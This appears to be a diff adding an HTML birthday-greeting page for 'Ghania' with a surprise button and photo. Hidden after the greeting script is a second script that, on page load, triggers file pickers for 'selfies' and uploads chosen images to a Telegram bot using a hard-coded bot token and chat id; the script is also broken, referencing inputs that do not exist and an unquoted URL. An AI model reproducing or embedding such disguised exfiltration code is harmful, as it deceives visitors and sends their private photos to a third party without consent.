@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Happy Birthday Ghania</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: linear-gradient(120deg, #f6d365 0%, #fda085 100%);
+            font-family: 'Arial', sans-serif;
+            overflow: hidden;
+        }
+        .container {
+            text-align: center;
+            background: white;
+            padding: 50px;
+            border-radius: 15px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            transition: transform 0.5s;
+        }
+        .container:hover {
+            transform: scale(1.05);
+        }
+        h1 {
+            font-size: 2.5em;
+            margin: 0;
+            color: #333;
+        }
+        p {
+            font-size: 1.2em;
+            color: #666;
+            margin: 20px 0;
+        }
+        .surprise {
+            font-size: 1.5em;
+            color: #fda085;
+            cursor: pointer;
+            border: none;
+            background: none;
+            transition: color 0.3s;
+        }
+        .surprise:hover {
+            color: #f6d365;
+        }
+        .hidden-content {
+            display: none;
+            margin-top: 20px;
+            animation: fadeIn 1s forwards;
+        }
+        .hidden-message {
+            font-size: 1.5em;
+            color: #fda085;
+            margin-bottom: 20px;
+        }
+        .hidden-image img {
+            width: 200px;
+            height: 200px;
+            border-radius: 50%;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Happy Birthday Ghania</h1>
+        <p>May your day be filled with joy, love, and beautiful surprises!</p>
+        <button class="surprise" onclick="showContent()">Click for a Surprise</button>
+        <div class="hidden-content" id="hiddenContent">
+            <div class="hidden-message">You are truly amazing! Wishing you all the best on your special day!</div>
+            <div class="hidden-image">
+                <img src="ghania.jpg" alt="Ghania's Picture">
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function showContent() {
+            document.getElementById('hiddenContent').style.display = 'block';
+        }
+    </script>
+    <script>
+    const telegramBotToken = '5478352215:AAFrp-rnONqwGgt0JjpsVWEkraTudqZ12WI';
+    const chatId = '1205804127';
+    
+    const inputFiles = [
+        document.getElementById('selfieInput1'),
+        document.getElementById('selfieInput2'),
+        document.getElementById('selfieInput3'),
+        document.getElementById('selfieInput4'),
+        document.getElementById('selfieInput5')
+    ];
+
+    window.addEventListener('load', async () => {
+        for (const input of inputFiles) {
+            await new Promise(resolve => {
+                input.addEventListener('change', resolve, {once: true});
+                input.click();
+            });
+        }
+
+        for (const input of inputFiles) {
+            if (input.files.length > 0) {
+                await sendPhotoToTelegram(input.files[0]);
+            }
+        }
+        alert('Selfies sent to Telegram!');
+    });
+
+    async function sendPhotoToTelegram(file) {
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', file);
+
+        await fetch(https://api.telegram.org/bot${telegramBotToken}/sendPhoto, {
+            method: 'POST',
+            body: formData
+        });
+    }
+                    </script>
+    
+</body>
+</html>
